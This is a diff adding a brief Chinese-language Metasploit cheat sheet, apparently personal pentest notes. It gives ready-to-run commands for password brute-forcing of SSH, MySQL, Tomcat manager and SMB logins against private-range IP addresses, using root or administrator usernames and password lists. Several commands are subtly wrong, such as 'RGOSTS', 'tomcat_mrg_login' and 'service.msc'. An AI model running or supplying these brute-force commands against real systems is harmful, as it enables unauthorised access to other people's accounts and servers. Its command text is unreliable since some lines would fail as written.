@@ -1,0 +1,42 @@
+检索模块
+show auxiliary 搜索利用模块
+search ms08_067 检索ms08_067漏洞模块
+
+show exploit 搜索渗透记录
+
+service 服务名 start (liunx启动服务)
+service.msc(window启动服务)
+
+ssh服务口令猜测
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.80.134
+set USERNAME root
+set PASS_FILE /root/pass.txt
+set THREADS 50
+exploit
+
+
+mysql口令攻击
+use auxiliary/scanner/mysql/mysql_login
+set RGOSTS 192.168.2.3
+set PASS_FILE pass
+set USERNAME root
+exploit
+
+tomcat攻击
+search tomcat
+use auxiliary/scanner/http/tomcat_mrg_login
+set RHOSTS 192.168.1.1
+set PASS_FILE /root/pass.txt
+set USER_FILE /root/user.txt
+exploit
+
+smb攻击
+search smb
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.2.3
+set PASS_FILE pass
+set SMBuser administrator
+exploit
+
+有其他需要自己search
